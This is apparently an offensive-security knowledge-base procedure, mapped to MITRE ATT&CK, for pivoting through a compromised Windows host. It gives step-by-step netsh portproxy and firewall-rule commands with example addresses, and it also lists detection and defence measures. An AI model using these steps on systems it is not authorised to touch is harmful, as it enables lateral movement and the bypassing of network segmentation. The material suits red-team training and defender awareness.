---
type: procedure
description: >-
  Sets up port forwarding on a compromised Windows machine using netsh to enable
  network pivoting.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Connection Proxy]]'
sub_techniques: []
tags:
  - network-pivoting
  - port-forwarding
  - netsh
  - lateral-movement
commands:
  - '[[commands/netsh-interface-portproxy-add-v4tov4]]'
  - '[[commands/netsh-advfirewall-add-inbound-rule]]'
  - '[[commands/netsh-advfirewall-add-outbound-rule]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-netsh-port-forwarding

## Summary

This procedure uses the built-in netsh utility on Windows to configure port forwarding rules, allowing attackers to redirect traffic from the compromised host to internal network resources. It enables lateral movement by turning the compromised machine into a proxy, bypassing network segmentation without additional tools.

## Description

Netsh port forwarding creates TCP rules that listen on specified local ports and forward incoming connections to destination hosts and ports on the target network. This is particularly useful in post-exploitation scenarios where direct access to internal systems is blocked by firewalls or NAT. The technique requires administrative privileges and modifies the Windows Firewall to permit the forwarded traffic. Once configured, attackers can connect to the listening ports on the pivot host to reach otherwise inaccessible services, such as RDP (3389) or HTTP (80). This maps to MITRE ATT&CK technique T1090 (Proxy) under the Lateral Movement tactic, facilitating deeper network compromise.

## Requirements

1. Administrative privileges on the compromised Windows machine (netsh portproxy and advfirewall require elevation).
2. Network connectivity from the attacker to the pivot host and from the pivot host to the target internal resources.
3. Windows Vista or later (portproxy feature availability).

## Defense

- Monitor for netsh.exe executions, especially 'interface portproxy' and 'advfirewall' commands via process auditing (Event ID 4688).
- Implement application whitelisting to restrict netsh usage or require approval for firewall changes.
- Regularly audit portproxy rules with 'netsh interface portproxy show all' and remove unauthorized forwards.
- Use network segmentation and microsegmentation to limit pivot host access to internal resources.
- Enable Windows Firewall logging to detect inbound/outbound rule additions.

## Objectives

1. Redirect external traffic through the compromised host to internal targets.
2. Enable access to restricted services like RDP or web servers on segmented networks.
3. Maintain persistence for ongoing lateral movement without deploying custom tools.

## Instructions

### Step 1: Add Port Proxy Forwarding Rule

**Context**: Create a TCP forwarding rule to listen on a local port and redirect traffic to the destination host/port. This step establishes the core pivoting mechanism. Use the generic syntax for flexibility, substituting actual values for your scenario.

**Command** ([[commands/netsh-interface-portproxy-add-v4tov4]]):
```cmd
netsh interface portproxy add v4tov4 listenport=%_LISTENPORT% connectaddress=%_CONNECTADDRESS% connectport=%_CONNECTPORT%
```

> This command adds an IPv4-to-IPv4 forwarding rule. The listenport defaults to binding on all interfaces (0.0.0.0) if not specified. For example, to forward local port 4545 to 192.168.50.44:4545, run: `netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545`. Repeat for additional ports like 80.

### Step 2: Open Inbound Firewall Rule

**Context**: Allow incoming traffic on the listening port through the Windows Firewall to ensure forwarded connections reach the netsh listener. This prevents the firewall from blocking the pivot traffic.

**Command** ([[commands/netsh-advfirewall-add-inbound-rule]]):
```cmd
netsh advfirewall firewall add rule name="%_RULE_NAME%" dir=in action=allow protocol=TCP localport=%_LOCALPORT%
```

> This adds an inbound TCP rule. For port 80, use: `netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80`. The rule name should be descriptive for easy identification and later deletion.

### Step 3: Open Outbound Firewall Rule

**Context**: Permit outbound traffic from the pivot host to the destination, ensuring the forwarded connections can traverse the firewall in both directions for bidirectional communication (e.g., reverse shells).

**Command** ([[commands/netsh-advfirewall-add-outbound-rule]]):
```cmd
netsh advfirewall firewall add rule name="%_RULE_NAME%" dir=out action=allow protocol=TCP localport=%_LOCALPORT%
```

> This adds an outbound TCP rule. For port 4545, use: `netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545`. Note that localport here refers to the source port on the pivot host.

### Step 4: Verify the Configuration

**Context**: Confirm the rules are active to validate successful setup. This step includes checking for errors and testing connectivity.

Run the following to list portproxy rules:
```cmd
netsh interface portproxy show all
```

> Expected output includes your added rules, e.g., `listen on IPv4: Connect to IPv4: Destination prefix: 192.168.50.44 port: 4545`. For firewall: `netsh advfirewall firewall show rule name=all | findstr PortForwarding` should list your rules.

Test by connecting from your attacker machine to the pivot's listening port (e.g., telnet pivot_ip 4545) and verify it reaches the destination.
